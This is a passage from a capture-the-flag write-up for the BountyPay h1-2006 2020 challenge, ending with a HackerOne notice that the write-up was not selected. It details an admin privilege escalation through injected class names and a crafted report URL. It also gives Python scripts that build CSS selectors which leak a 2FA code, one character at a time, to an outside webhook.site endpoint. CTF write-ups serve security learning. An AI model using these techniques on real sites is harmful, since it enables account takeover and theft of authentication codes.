Yes! Nothing cool happened, but I've noticed that scriptalertscript was a class name, then I killed it, it was so obvious that we needed to change it to upgradeToAdmin and use the report page with the parameter polution that we discovered at Recon stage. But we are missing something, we are missing the click trigger! So how can we trigger the click of avatar? On this piece of code we see that there is no tab4 element, then we can set the avatar to upgradeToAdmin tab4 and it will trigger the click function if we pass #tab4 as fragment of url.

<ul class="nav nav-tabs" style="margin-bottom:40px;margin-top:30px">
                <li role="presentation" class="tab tab1 active" data-target="home"><a href="#">Home</a></li>
                <li role="presentation" class="tab tab2" data-target="tickets"><a href="#">Support Tickets</a></li>
                <li role="presentation" class="tab tab3" data-target="profile"><a href="#">Profile</a></li>
                                <li role="presentation"><a href="/logout">Logout</a></li>
            </ul>

So let's intercept the avatar change again and put the right class on it, after we set the url to /?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab4, that will trigger the tab4 click, then upgradeToAdmin click, then it will look for the value of an input with name username, that will be sandra.allison, all this will happen because admin will read the ticket. Encoding this to base64 and sending to /admin/report should work fine. The final url will be https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ==. Going to this url and reloading the page will escate us to admin.

![Marten is owned](./staff3.png)

Now we have Marten's password!

Last step, big step

Let's log in with marten.mickos credentials at app.bountypay.h1ctf.com to see what is happening there. After bypassing 2FA, we are in, first I tried loading april's transactions because of the log file in the beginning of the challenge, but it was actually the may's transactions.

![Staff page](./close1.png)

Hitting the Pay button lead us to another 2FA challenge, this time the easy payload didn't work and I were confused of what was happening, then I checked the requests and found this POST with an url.

![Staff page](./close2.png)

Ahead to the POSTed site I found something really useless.

/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}

Then I realised that it was a css exfiltration, since I've seen those on other CTFs. Ok, now that we know it is a css exfiltration we need to try to find where to exfiltrate. First I declared an endpoint /app.css on beeceptor and runned the following python script to generate it.

import string

for i in string.printable:
    print("input[name^='"+i+"'] { background-image: url(https://webhook.site/61451e7d-6fda-4e32-84f7-09a45e1d00ad/"+i+"); }")

Here input[name^=i] will make the background-image request if there is an input with i starting letter. Then I repeated this completing characters until I get that the name I was exfiltrating was code_x with x from 1 to 7. Then I coded this small script to exfiltrate the characters and it was done!

import string

for x in range(7):
    for i in string.ascii_lowercase + string.ascii_uppercase + string.digits:
        print("input[name='code_"+str(x+1)+"'][value='"+i+"'] { background-image: url(https://webhook.site/61451e7d-6fda-4e32-84f7-09a45e1d00ad/2fa_"+str(x+1)+":"+i+"); }")

![Webhook with password](./webhookcss.png)

After organizing it in the right order we had the password Dobzelm and finally solved the challenge!

![Solved](./solve.png)

activities.message:
Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
